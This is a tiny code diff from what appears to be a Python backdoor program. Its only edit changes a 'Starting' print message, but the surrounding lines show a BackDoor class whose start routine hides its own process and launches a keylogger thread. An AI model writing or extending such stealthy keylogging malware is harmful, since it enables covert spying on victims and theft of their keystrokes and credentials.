@@ -146,7 +146,7 @@ class BackDoor:
     def start(self):
         self.process_yaml()
         self.hide_process()
-        print("Starting.....")
+        print("Starting......")
         try:
             keylog_t = Thread(target=self.start_keylogger)
             keylog_t.start()
